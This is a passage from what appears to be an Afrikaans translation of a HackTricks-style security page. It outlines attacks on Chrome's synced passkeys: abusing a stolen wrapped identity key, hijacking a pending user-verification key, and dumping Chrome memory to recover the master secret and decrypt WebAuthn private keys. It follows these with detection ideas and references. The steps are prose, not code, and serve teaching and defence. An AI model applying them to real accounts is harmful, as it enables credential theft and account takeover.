   - Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator-versoekbinding te onderteken.
   - Herlei die teruggestuurde assertion na die relying party.
   - Dit is veral waardevol wanneer die RP `userVerification=preferred` aanvaar of versuim om assertions met **`UV=0`** te verwerp.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Dwing her-onboarding af deur `passkey_enclave_state` te skrap of deur 'n geldige ondertekende `device/forget`-operasie te stuur.
   - As onboarding die toestel in **`uv_key_pending`** laat, registreer 'n UV-public key wat deur die aanvaller beheer word.
   - As die verskaffer nie die attestation / oorsprong van veilige hardeware vir die nuwe UV-key verifieer nie, word latere handtekeninge van die aanvallersleutel as **`UV=1`** behandel.
3. **Diefstal van master-secret / SDS-herstel**<sup>[[4]](#references)</sup>
   - Dwing herstel of hertoetrede af sodat Chrome die gesinkroniseerde-passkey-master secret ophaal.
   - Hou dop vir herskepping/wysiging van `passkey_enclave_state`, en dump dan Chrome se geheue terwyl die gewone teks **security domain secret (SDS)** daarin voorkom.
   - Gebruik die herwonne SDS om die geënkripteerde velde in elke `WebauthnCredentialSpecifics`-rekord te dekripteer en draagbare WebAuthn-private keys te herwin.

### DFIR / opsporingsidees

- Monitor die **skrap/herSkepping** van `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Stel 'n waarskuwing op vir abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur prosesse wat nie blaaiers is nie.
- Stel 'n waarskuwing op vir **Chrome-geheuedumps** of verdagte geheuetoegang oor prosesgrense heen.
- Ondersoek herhaalde versoeke vir 'n **Google Password Manager-herstel-PIN** of onverwagte her-onboarding.
- Onthou dat WebAuthn se **`signCount`** dikwels nie nuttig is vir gesinkroniseerde passkeys nie, omdat dit konstant kan bly; klassieke kloonopsporing is dus swak.

## References

- [1] [Unit 42 – 'n Ondersoek na jare se onopgemerkte bedrywighede wat hoëwaardesektore teiken](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-geloofsbriewe-dekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Binne Ink Dragon: Onthulling van die aflosnetwerk en die innerlike werking van 'n geheimsinnige offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: 'n Nuwe aanvalsoppervlak in wagwoordlose verifikasie](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-sleutelberging](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Aanvalle op Microsoft-stelsels en -netwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Hoe die Active Directory-databerging werklik werk: binne NTDS.dit (Deel 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Afstandsdump van Lsass-wagwoorde](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho brei sy kuberspioenasie-arsenaal uit met die Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-funksie en `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B`-rugsteunmodus](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – beëindiging van aktiewe sessies](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
